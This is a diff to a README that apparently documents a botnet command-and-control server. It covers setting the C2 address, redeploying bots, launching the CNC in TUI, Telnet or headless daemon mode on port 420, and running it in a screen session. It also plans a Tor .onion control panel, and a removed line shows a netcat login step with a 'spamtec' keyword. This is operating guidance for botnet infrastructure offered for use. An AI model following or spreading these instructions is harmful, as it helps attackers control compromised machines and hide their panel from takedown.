@@ -112,14 +112,15 @@ To change the C2 address later: `python3 setup.py` → option `[2]`. Redeploy bo
 ### Starting the CNC
 
 ```bash
-./server              # TUI mode (default)
-
-./server --split      # Telnet mode on admin port(legacy, only for those needing to manage multiple remote users)
+./server              # interactive launcher — pick TUI, Telnet, or both
+./server --tui        # TUI mode only
+./server --split      # Telnet mode on port 420
+./server --daemon     # Telnet headless (no TUI)
 ```
 
-Run in background with `screen -S vision ./server` (detach: `Ctrl+A, D`).
+**Web Panel (Tor)** — WIP, coming soon. Will serve a .onion dashboard with username/password login.
 
-Split mode: `nc YOUR_IP 420` → type `spamtec` → login. (legacy)
+Run in background with `screen -S vision ./server` (detach: `Ctrl+A, D`).
 
 > Full binary map: [`build.sh`](tools/build.sh)
 
